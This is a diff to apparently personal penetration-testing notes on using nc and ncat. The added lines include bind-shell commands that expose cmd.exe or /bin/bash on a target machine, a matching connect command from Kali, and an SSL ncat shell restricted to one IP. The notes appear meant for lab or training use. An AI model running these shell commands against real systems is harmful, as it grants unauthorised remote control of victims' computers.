@@ -1,3 +1,24 @@
+
+## nc
+start the listener using nc.exe (target PC - Windows):
+```
+nc -lvp 4444 -e cmd.exe
+```
+
+On Linux:
+```
+nc -lvp 4444 -e /bin/bash
+```
+
+Connect to the listener (Kali):
+```
+nc -nv <targetIP> <targetPort>
+```
+
+You should see the command promt of the target PC:
+![[Pasted image 20260419044435.png]]
+
+## ncat
 ncat has encryption, nc does not.
 This will start WITHOUT encryption
 ```
@@ -24,7 +45,12 @@ ncat -lvvp 4444 --ssl
 ncat.exe -v <kaliIP> <port> --ssl
 ```
 
-If this failes, have a look at the procol being used for SSL (Linux ncat is more updated than Windows)
+## Whitelist on a certain ip that is allowed to connect:
+```
+ncat -lvp 444 -e cmd.exe --allow <kaliIP> --ssl
+```
+
+If this failed, have a look at the protocol being used for SSL (Linux ncat is more updated than Windows)
 
 To Check the min protocol version that Kali uses:
 
